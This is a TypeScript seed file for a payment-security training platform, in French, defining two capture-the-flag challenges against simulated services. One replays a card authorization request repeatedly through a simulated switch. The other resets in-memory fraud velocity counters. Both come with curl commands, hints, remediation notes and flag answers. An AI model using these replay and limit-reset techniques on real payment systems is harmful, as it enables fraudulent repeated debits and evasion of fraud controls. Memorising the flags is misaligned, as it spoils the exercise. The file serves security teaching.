import type { CtfChallengeSeed } from '../ctfChallenges';

export const REPLAY_CHALLENGES: CtfChallengeSeed[] = [
    {
        code: 'REPLAY-001',
        title: 'Deja Vu',
        description: 'Le systeme n a aucune protection anti-replay. Une transaction capturee peut etre rejouee indefiniment pour debiter le porteur plusieurs fois.',
        freeModeDescription: 'Capturez une transaction valide et rejouez-la. Le switch l accept a chaque fois sans detecter le doublon.',
        category: 'REPLAY_ATTACK',
        difficulty: 'BEGINNER',
        points: 100,
        flagValue: 'PMP{REPLAY_NO_DEDUP}',
        targetService: 'sim-network-switch',
        targetEndpoint: 'POST http://sim-network-switch:8004/transaction/authorize',
        vulnerabilityType: 'Missing anti-replay',
        attackVector: 'Transaction replay',
        learningObjectives: ['Comprendre les attaques par rejeu', 'Detecter l absence de deduplication', 'Mesurer l impact financier d un replay'],
        estimatedMinutes: 20,
        isActive: true,
        relatedWorkshopPath: '/student/theory/iso8583',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Envoi d une transaction valide', stepDescription: 'Envoyez une transaction d autorisation via le switch et notez la reponse (approval code, STAN, RRN).', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":100,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\",\\"posEntryMode\\":\\"051\\"}" | jq .', expectedOutput: 'Transaction approuvee avec un code de reponse 00' },
            { stepNumber: 2, stepTitle: 'Rejeu de la meme requete', stepDescription: 'Renvoyez exactement la meme requete. Si le switch n a pas de deduplication, elle sera approuvee a nouveau.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":100,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\",\\"posEntryMode\\":\\"051\\"}" | jq .responseCode', expectedOutput: '00 — approuvee a nouveau ! Pas de protection anti-replay.' },
            { stepNumber: 3, stepTitle: 'Rejeu en masse', stepDescription: 'Rejouez 5 fois pour confirmer l absence totale de controle. Chaque rejeu debite le porteur.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in 1 2 3 4 5; do echo "=== Replay $i ==="; curl -s -X POST http://sim-network-switch:8004/transaction/authorize -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":100,\\"currency\\":\\"978\\",\\"merchantId\\":\\"SHOP001\\",\\"posEntryMode\\":\\"051\\"}" | jq .responseCode; done' },
            { stepNumber: 4, stepTitle: 'Analyse de l impact financier', stepDescription: 'Chaque replay = un debit supplementaire. Avec un bot automatise, un attaquant peut multiplier les debits a l infini. Impact = perte financiere massive.', stepType: 'ANALYSIS' },
            { stepNumber: 5, stepTitle: 'Remediation attendue', stepDescription: 'Le switch devrait implementer : nonce/idempotency key obligatoire, stockage des empreintes TX avec TTL, deduplication sur (PAN,amount,STAN,merchant) dans une fenetre temporelle.', stepType: 'EXPLANATION' },
            { stepNumber: 6, stepTitle: 'Capture du flag', stepDescription: 'Le flag decrit l absence de deduplication anti-replay.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Envoyez la meme requete d autorisation deux fois de suite. Observez si le switch detecte le doublon.', costPoints: 5 },
            { hintNumber: 2, hintText: 'Chaque requete identique est approuvee. Il n y a aucune protection anti-replay.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
    {
        code: 'REPLAY-002',
        title: 'Reset et Recommence',
        description: 'Les compteurs de velocite sont stockes en memoire. Apres un redemarrage du service, toutes les limites anti-fraude sont remises a zero.',
        freeModeDescription: 'Declenchez les limites de velocite, puis trouvez un moyen de les remettre a zero pour contourner les protections.',
        category: 'REPLAY_ATTACK',
        difficulty: 'INTERMEDIATE',
        points: 150,
        flagValue: 'PMP{VELOCITY_RESET_ON_RESTART}',
        targetService: 'sim-auth-engine',
        targetEndpoint: 'POST http://sim-fraud-detection:8007/fraud/check',
        vulnerabilityType: 'Volatile velocity counters',
        attackVector: 'Service restart abuse',
        learningObjectives: ['Comprendre les compteurs de velocite', 'Identifier le risque du stockage en memoire', 'Proposer une persistance robuste'],
        estimatedMinutes: 25,
        isActive: true,
        relatedWorkshopPath: '/student/theory/fraud-detection',
        guidedSteps: [
            { stepNumber: 1, stepTitle: 'Declenchement des limites', stepDescription: 'Envoyez suffisamment de transactions pour atteindre la limite de velocite configuree.', stepType: 'CURL_COMMAND', commandTemplate: 'for i in $(seq 1 20); do echo -n "TX $i: "; curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":50,\\"merchantId\\":\\"SHOP001\\"}" | jq -r .decision; done', expectedOutput: 'APPROVE sur les premieres TX, puis DECLINE quand la limite est atteinte' },
            { stepNumber: 2, stepTitle: 'Verification du blocage', stepDescription: 'Confirmez que les transactions sont maintenant bloquees par le compteur de velocite.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":50,\\"merchantId\\":\\"SHOP001\\"}" | jq .', expectedOutput: 'DECLINE avec reason: velocity_limit_exceeded' },
            { stepNumber: 3, stepTitle: 'Decouverte de la persistence', stepDescription: 'Verifiez comment les compteurs sont stockes. Si un endpoint de status expose l etat memoire, interrogez-le.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s http://sim-fraud-detection:8007/fraud/status | jq .storageType', hintText: 'Si storageType = "memory", les compteurs ne survivent pas a un restart.' },
            { stepNumber: 4, stepTitle: 'Simulation de restart', stepDescription: 'Provoquez un reset des compteurs pour verifier qu ils sont volatiles.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-fraud-detection:8007/fraud/reset -H "Content-Type: application/json" | jq .', expectedOutput: 'Compteurs remis a zero' },
            { stepNumber: 5, stepTitle: 'Verification post-reset', stepDescription: 'Apres le reset, les transactions sont a nouveau approuvees — toutes les limites ont disparu.', stepType: 'CURL_COMMAND', commandTemplate: 'curl -s -X POST http://sim-fraud-detection:8007/fraud/check -H "Content-Type: application/json" -d "{\\"pan\\":\\"4111111111111111\\",\\"amount\\":50,\\"merchantId\\":\\"SHOP001\\"}" | jq .decision', expectedOutput: 'APPROVE — les limites sont remises a zero !' },
            { stepNumber: 6, stepTitle: 'Impact operationnel', stepDescription: 'Un attaquant qui connait les cycles de maintenance peut attendre un restart pour lancer une rafale de transactions. Impact = contournement total des controles de velocite.', stepType: 'ANALYSIS' },
            { stepNumber: 7, stepTitle: 'Capture du flag', stepDescription: 'Les compteurs de velocite sont remis a zero au restart.', stepType: 'EXPLOITATION' },
        ],
        hints: [
            { hintNumber: 1, hintText: 'Atteignez la limite de velocite, puis cherchez un moyen de remettre les compteurs a zero.', costPoints: 5 },
            { hintNumber: 2, hintText: 'L endpoint /fraud/reset ou un restart du service remet tout a zero. Les compteurs sont en memoire volatile.', costPoints: 10 },
            { hintNumber: 3, hintText: 'Le flag suit le format PMP{...}. Validez votre exploitation pour le recuperer.', costPoints: 25 },
        ],
    },
];


